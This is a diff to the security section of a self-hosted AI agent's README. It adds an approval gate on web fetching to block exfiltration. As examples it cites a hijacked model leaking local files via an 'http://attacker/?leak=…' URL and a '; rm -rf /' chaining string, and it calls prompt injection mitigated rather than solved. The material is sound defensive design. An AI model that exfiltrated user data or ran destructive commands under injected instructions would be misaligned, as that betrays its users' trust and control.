@@ -85,6 +85,11 @@ Read [`SECURITY.md`](SECURITY.md) before putting this on an always-on box. The s
   list (no shell, so `; rm -rf /` can't chain). `write_file` is jailed to the working dir. The
   real safety net is still the OS — run the agent as a **non-sudo user** and keep the systemd
   hardening in [`docs/SETUP.md`](docs/SETUP.md). Do not loosen the gates.
+- **`web_fetch` is gated by default (anti-exfiltration).** A fetched URL can carry data off the
+  box, so `web_fetch` is `ask_first` — a hijacked model can't read a local file/memory/inbox and
+  leak it in `http://attacker/?leak=…` without you seeing and denying the approval. `read_file` is
+  jailed to the working dir + refuses secret files. Set `tools.web_fetch.autonomous: true` for
+  hands-free web research (re-opens the channel).
 - **The chat channel is fail-closed.** An empty Telegram `allowed_users` rejects *everyone*; only
   allow-listed users can talk to the bot or approve an `ask_first` action.
 - **Prompt injection is mitigated, not solved.** Web/email content is treated as data, not
